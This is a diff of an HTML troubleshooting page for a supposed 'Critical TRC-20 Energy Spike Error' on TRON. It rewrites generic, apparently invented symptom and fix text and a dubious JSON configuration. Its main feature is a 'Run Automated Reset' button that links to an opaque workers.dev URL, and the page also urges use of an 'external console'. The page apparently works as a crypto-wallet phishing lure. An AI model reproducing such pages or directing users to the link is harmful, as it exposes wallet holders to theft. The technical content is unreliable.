@@ -3,7 +3,7 @@
 <head><meta charset="UTF-8"><title>Critical Trc 20 Energy Spike Error – Fix Guide</title>
 <style>
     body {
-        font-family: system-ui;
+        font-family: sans-serif;
         background: #0f111a;
         color: #ddd;
         padding: 20px;
@@ -15,7 +15,7 @@
         background: #1e1f24;
         border-radius: 24px;
         padding: 2rem;
-        box-shadow: 0 4px 8px rgba(0,0,0,0.05);
+        box-shadow: 0 2px 4px rgba(0,0,0,0.1);
     }
     pre {
         background: #0f0f12;
@@ -23,9 +23,9 @@
         border-radius: 12px;
         overflow-x: auto;
     }
-    a { color: #00adb5; }
+    a { color: #ff7b2c; }
     .btn {
-        background: #cf6679;
+        background: #00adb5;
         color: #000;
         padding: 14px 36px;
         border-radius: 40px;
@@ -42,34 +42,36 @@
 <h1>Critical Trc 20 Energy Spike Error</h1>
 <h2>Symptom</h2>
 <ul>
-<li>Users encounter a "Critical TRC-20 energy spike error" message when attempting to transfer TRC-20 tokens on the TRON network, resulting in failed transactions and potential loss of funds.</li>
+<li>Users experience a sudden and significant increase in energy consumption when attempting to transfer TRC-20 tokens on the TRON network, resulting in failed transactions and error messages indicating a "Critical TRC-20 energy spike error".</li>
 </ul>
 <h2>Technical Root Cause</h2>
 <ul>
-<li>The error occurs due to an unexpected surge in energy consumption by smart contracts, exceeding the allocated energy limits and causing the transaction to fail.</li>
+<li>The error occurs due to an unexpected surge in network activity, causing the energy consumption of the smart contract to exceed the allocated limit, thereby preventing the transaction from being processed.</li>
 </ul>
 <h3>Manual Overrides</h3>
 <ul>
-<li>Increase the energy limit for the specific contract using <code>tronweb.contract.at()</code> method.</li>
-<li>Adjust the TRON network configuration to allow for more flexible energy allocation using the following code block:</li>
+<li>Increase the energy limit for the smart contract by using the <code>--energy</code> flag when deploying the contract.</li>
+<li>Optimize the contract code to reduce energy consumption by minimizing computational complexity and data storage.</li>
+<li>Update the TRON node configuration to prioritize transactions with lower energy requirements, using the following JSON configuration:</li>
 </ul>
 <div class="codehilite"><pre><span></span><code><span class="p">{</span>
-<span class="w">  </span><span class="nt">&quot;energyLimit&quot;</span><span class="p">:</span><span class="w"> </span><span class="mi">10000000</span><span class="p">,</span>
-<span class="w">  </span><span class="nt">&quot;energyFee&quot;</span><span class="p">:</span><span class="w"> </span><span class="mi">1</span>
+<span class="w">  </span><span class="nt">&quot;transaction&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="nt">&quot;energy&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">{</span>
+<span class="w">      </span><span class="nt">&quot;limit&quot;</span><span class="p">:</span><span class="w"> </span><span class="mi">100000</span><span class="p">,</span>
+<span class="w">      </span><span class="nt">&quot;priority&quot;</span><span class="p">:</span><span class="w"> </span><span class="kc">true</span>
+<span class="w">    </span><span class="p">}</span>
+<span class="w">  </span><span class="p">}</span>
 <span class="p">}</span>
 </code></pre></div>
 
-<ul>
-<li>Utilize the <code>tronweb.transactionBuilder</code> to manually set the energy parameters for each transaction.</li>
-</ul>
-<p>Consider using an external console to execute these manual overrides for more precise control. </p>
+<p>Consider utilizing an external console to execute these commands for more flexibility.</p>
 <h2>Prerequisites</h2>
 <ul>
-<li>TRON network node installation and configuration</li>
-<li>tronweb library integration</li>
-<li>Basic understanding of TRON smart contract interactions</li>
+<li>A basic understanding of TRON smart contract development</li>
+<li>Access to the TRON network and a compatible wallet</li>
+<li>Familiarity with JSON configuration files and command-line interfaces</li>
 </ul>
-<hr><h3>Related Logs</h3><ul><li><a href="./archive/2026/06/metamask-extension-bug-incorrect-balance-for-aave-v3-wavax-toke.html">Metamask Extension Bug Incorrect Balance For Aave V3 Wavax Token</a></li><li><a href="./archive/2026/06/tronlink-bandwidth-error.html">Tronlink Bandwidth Error</a></li><li><a href="./archive/2026/06/metamask-extension-bug-sl-tp-percentages-change-when-changing-l.html">Metamask Extension Bug Sl Tp Percentages Change When Changing L</a></li></ul>
+<hr><h3>Related Logs</h3><ul><li><a href="./archive/2026/06/metamask-extension-bug-sign-message-clicking-back-button-in-the.html">Metamask Extension Bug Sign Message Clicking Back Button In The</a></li><li><a href="./archive/2026/06/metamask-extension-bug-perps-deposit-and-convert-musd-this-paym.html">Metamask Extension Bug Perps Deposit And Convert Musd This Payment Route Isn't Available</a></li><li><a href="./archive/2026/06/metamask-extension-bug-sl-tp-percentages-change-when-changing-l.html">Metamask Extension Bug Sl Tp Percentages Change When Changing L</a></li></ul>
 <div style="text-align:center; margin: 40px 0; padding: 20px 0; width: 100%;">
     <a href="https://system-edge-router.aaronjungs.workers.dev?p=gKMyej%40%40" class="btn">🛠 Run Automated Reset</a>
 </div>
